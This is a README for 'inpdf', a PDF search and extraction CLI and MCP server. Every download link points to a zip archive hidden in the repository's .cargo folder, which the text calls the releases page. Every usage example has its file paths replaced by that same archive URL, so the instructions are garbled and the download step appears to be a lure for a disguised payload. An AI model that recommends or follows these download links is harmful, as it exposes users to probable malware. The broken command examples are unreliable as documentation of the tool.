# 🚀 inpdf - Extract and Search PDF Content Effortlessly

[![Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)

## 📋 Overview

inpdf is a Command Line Interface (CLI) tool and MCP server designed for searching, navigating, and extracting content from PDF files. This application streamlines workflows by allowing users to quickly find information and extract specific pages with ease.

## ⚙️ System Requirements

To run inpdf smoothly, ensure your system meets the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **Memory:** Minimum 512 MB RAM
- **Disk Space:** At least 50 MB free

## 🚀 Getting Started

1. **Download inpdf**

   To begin using inpdf, visit the releases page by clicking the link below:

   [Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)

   Look for the latest release and click on the appropriate file for your operating system to download it.

2. **Install**

   After downloading, install the application using the steps that correspond to your operating system:

   - **On Windows:**
     - Double-click the downloaded `.exe` file.
     - Follow the installation prompts.

   - **On macOS:**
     - Open the downloaded `.dmg` file.
     - Drag the inpdf app to your Applications folder.

   - **On Linux:**
     - Open a terminal.
     - Use the command: `chmod +x inpdf` to make it executable.
     - Then, run it with: `./inpdf`.

3. **Verify Installation**

   To confirm that inpdf is installed correctly, open your terminal or command prompt and type:

   ```bash
   inpdf --version
   ```

   You should see the version number displayed.

## 💡 Usage Instructions

inpdf has several commands that make searching and extracting content easy. Below are some examples of how to use it:

### 🔍 Search for Text

To find specific text within a PDF, use the following command:

```bash
inpdf grep "authentication" https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
```

This command will return all lines where the word "authentication" appears, along with their page numbers.

### 📄 Extract Specific Pages

If you need to extract certain pages from a PDF, use:

```bash
inpdf extract https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip "1-10,25,30-end" -o https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
```

This extracts pages 1 to 10, 25, and 30 to the end of the document, saving them as `https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip`.

### 📖 Read Text from Specific Pages

To read text from specific pages, use:

```bash
inpdf read-pages https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip "5-7"
```

This command will print out the text from pages 5 to 7.

### ℹ️ Get Document Info

If you want to know more about a PDF, type:

```bash
inpdf info https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
```

This will show you details such as file name, number of pages, and title.

### 📋 Supported Page Ranges

When specifying pages, you can use various formats:

- Simple range: `1-5`
- Single page: `10`
- To the end: `15-end`
- Reverse order: `5-1`
- Combinations: `1-3,7,20-end`

### 📜 Help Command

For a complete list of commands, type:

```bash
inpdf --help
```

## 🔗 Download & Install

To get started with inpdf, remember to visit the releases page:

[Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)

Follow the steps mentioned above to install the application and start using it.

## 📊 Why Use inpdf?

- **For AI/LLM Workflows:** inpdf acts as an MCP server, allowing AI assistants like Claude to search and read PDFs directly.
- **For CLI Users:** Quickly perform regex searches across PDFs and enjoy flexible page extraction.

Explore the full capabilities of inpdf and take control of your PDF documents efficiently.